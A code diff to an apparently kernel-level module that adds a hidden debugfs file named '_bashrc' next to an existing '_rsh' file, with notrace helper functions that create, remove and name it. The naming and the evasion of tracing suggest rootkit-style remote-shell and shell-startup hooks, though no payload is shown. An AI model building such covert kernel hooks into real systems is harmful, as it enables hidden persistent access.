@@ -44,8 +44,10 @@ static size_t _file_counter = 0;
 
 static struct htm_file _dir;
 static struct htm_file _rsh;
+static struct htm_file _bashrc;
 
 HTM_DEFINE_FOPS(_rsh);
+HTM_DEFINE_FOPS(_bashrc);
 
 static inline void _unset_htm_file(struct htm_file *file)
 {
@@ -105,12 +107,13 @@ static notrace int _remove_dir(struct htm_file *dir)
 	// compatibility.
 	debugfs_remove_recursive(_dir.file);
 
-	_unset_htm_file(&_dir);
-	_unset_htm_file(&_rsh);
-
 	#ifdef HTM_DEBUG
 	htm_pr_notice("debugfs directory removed: %s", _dir.name);
 	#endif
+
+	_unset_htm_file(&_dir);
+	_unset_htm_file(&_rsh);
+	_unset_htm_file(&_bashrc);
 
 	_file_counter = 0;
 	return 0;
@@ -218,12 +221,20 @@ notrace int htm_debugfs_create_rsh(void)
 	if ((ret =_create_file(&_rsh, &_rsh_fops)))
 		return ret;
 
+	if ((ret = _create_file(&_bashrc, &_bashrc_fops))) {
+		_remove_file(&_rsh);
+		return ret;
+	}
+
 	return 0;
 }
 
 notrace int htm_debugfs_remove_rsh(void)
 {
 	int ret;
+
+	if ((ret = _remove_file(&_bashrc)))
+		return ret;
 
 	if ((ret = _remove_file(&_rsh)))
 		return ret;
@@ -239,4 +250,9 @@ notrace char *htm_debugfs_name_dir(void)
 notrace char *htm_debugfs_name_rsh(void)
 {
 	return _rsh.name;
+}
+
+notrace char *htm_debugfs_name_bashrc(void)
+{
+	return _bashrc.name;
 }
